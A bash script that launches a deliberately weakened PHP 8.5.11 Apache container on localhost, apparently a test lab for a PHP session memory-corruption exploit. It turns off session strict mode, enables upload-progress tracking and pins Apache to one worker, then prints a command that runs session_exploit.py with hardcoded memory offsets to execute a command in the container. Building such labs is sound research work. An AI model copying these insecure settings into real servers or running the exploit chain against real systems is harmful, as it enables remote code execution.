#!/usr/bin/env bash
# Spawn the official PHP 8.5.11 Debian/Bookworm Apache lab used by the
# session-chain profile. Run with sudo:
#
#   sudo bash lab/start-php8511-docker.sh
#   sudo bash lab/start-php8511-docker.sh --down
#
# Override with environment variables:
#   P2S_IMAGE=php:8.5.11-apache
#   P2S_PORT=18093
#   P2S_BASE=/tmp/p2s-8511
#   P2S_CONTAINER=p2s-8511
set -euo pipefail

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "run this with sudo" >&2
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(dirname "$SCRIPT_DIR")"
IMAGE="${P2S_IMAGE:-php:8.5.11-apache}"
PORT="${P2S_PORT:-18093}"
BASE="${P2S_BASE:-/tmp/p2s-8511}"
NAME="${P2S_CONTAINER:-p2s-8511}"
PROOF="$BASE/out/p1"

if ! command -v docker >/dev/null 2>&1; then
    echo "docker not found" >&2
    exit 1
fi

case "$BASE" in
    ""|"/"|"/tmp"|"/home"|"/root")
        echo "refusing unsafe P2S_BASE=$BASE" >&2
        exit 1
        ;;
esac

if [[ "${1:-}" == "--down" ]]; then
    docker rm -f "$NAME" 2>/dev/null || true
    echo "removed $NAME"
    exit 0
fi

# The local shell may point at a missing wrapper socket.
if ! docker info >/dev/null 2>&1; then
    if [[ -S /var/run/docker.sock ]]; then
        export DOCKER_HOST=unix:///var/run/docker.sock
    fi
fi
if ! docker info >/dev/null 2>&1 && command -v systemctl >/dev/null 2>&1; then
    systemctl start docker >/dev/null 2>&1 || true
    sleep 2
fi
if ! docker info >/dev/null 2>&1; then
    echo "cannot reach a Docker daemon; start Docker and retry" >&2
    exit 1
fi

if ! docker image inspect "$IMAGE" >/dev/null 2>&1; then
    echo "pulling $IMAGE"
    if ! docker pull "$IMAGE"; then
        IMAGE="php:8.5.11-apache-bookworm"
        echo "retrying with $IMAGE"
        docker pull "$IMAGE"
    fi
fi

rm -rf "$BASE"
mkdir -p "$BASE/www" "$BASE/out"
chmod 0777 "$BASE/out"

cat > "$BASE/www/index.php" <<'PHP'
<?php echo "ok\n";
PHP

cat > "$BASE/php.ini" <<'INI'
display_errors=On
display_startup_errors=On
log_errors=On
error_reporting=E_ALL
expose_php=On

memory_limit=8M
post_max_size=64M
upload_max_filesize=64M
file_uploads=On
max_file_uploads=20
max_input_vars=1000
max_input_nesting_level=64
enable_post_data_reading=On
variables_order=EGPCS

session.save_handler=files
session.save_path=/tmp
session.use_cookies=1
session.use_only_cookies=0
session.use_strict_mode=0
session.upload_progress.enabled=On
session.upload_progress.cleanup=On
session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS
INI

docker rm -f "$NAME" >/dev/null 2>&1 || true

# Pin the prefork pool to one worker inside the image, then start Apache.
docker run -d --name "$NAME" \
    -p "127.0.0.1:${PORT}:80" \
    -v "$BASE/www:/var/www/html" \
    -v "$BASE/php.ini:/usr/local/etc/php/conf.d/zz-lab.ini:ro" \
    -v "$BASE/out:/out" \
    "$IMAGE" \
    bash -c '
        set -e
        a2dismod mpm_event >/dev/null 2>&1 || true
        a2enmod mpm_prefork >/dev/null 2>&1 || true
        conf=/etc/apache2/mods-available/mpm_prefork.conf
        if [ -f "$conf" ]; then
            sed -i -E \
                -e "s/^[[:space:]]*StartServers[[:space:]].*/    StartServers 1/" \
                -e "s/^[[:space:]]*MinSpareServers[[:space:]].*/    MinSpareServers 1/" \
                -e "s/^[[:space:]]*MaxSpareServers[[:space:]].*/    MaxSpareServers 1/" \
                -e "s/^[[:space:]]*MaxRequestWorkers[[:space:]].*/    MaxRequestWorkers 1/" \
                -e "s/^[[:space:]]*MaxConnectionsPerChild[[:space:]].*/    MaxConnectionsPerChild 0/" \
                "$conf"
        else
            printf "%s\\n" "ServerLimit 1" "StartServers 1" \
                "MinSpareServers 1" "MaxSpareServers 1" \
                "MaxRequestWorkers 1" "MaxConnectionsPerChild 0" \
                > /etc/apache2/conf-enabled/zz-worker.conf
        fi
        exec apache2-foreground
    '

for _ in $(seq 1 60); do
    if curl -fsS --max-time 1 "http://127.0.0.1:${PORT}/index.php" >/dev/null 2>&1; then
        break
    fi
    sleep 0.25
done
if ! curl -fsS --max-time 2 "http://127.0.0.1:${PORT}/index.php" >/dev/null 2>&1; then
    echo "container failed to serve HTTP; logs:" >&2
    docker logs --tail 80 "$NAME" >&2 || true
    exit 1
fi

echo
echo "container: $NAME"
echo "image:     $IMAGE"
echo "target:    http://127.0.0.1:${PORT}/index.php"
echo "proof:     $PROOF"
echo
echo "effective config:"
docker exec "$NAME" php -i 2>/dev/null | grep -E \
    '^(memory_limit|post_max_size|max_input_vars|display_errors|session\.upload_progress\.enabled|session\.use_strict_mode|session\.use_cookies)' \
    || true
echo
echo "run the chain:"
cat <<EOF
python3 "$REPO_DIR/session_exploit.py" \\
  -u http://127.0.0.1:${PORT}/index.php \\
  -c 'id>/out/p1' \\
  --proof-file "$PROOF" \\
  --poison big --huge-mb 12 --rotate \\
  --zif-offset 0x5996e0 \\
  --dtor-offset 0x7b47a0 \\
  --htdata-offset 0x690d8 \\
  --stage1-n 841 \\
  --stage1-forge-len 63 \\
  --stage2-t 406 \\
  --stage2-v 16 \\
  --carrier
EOF
echo
echo "stop with: sudo bash $SCRIPT_DIR/$(basename "$0") --down"
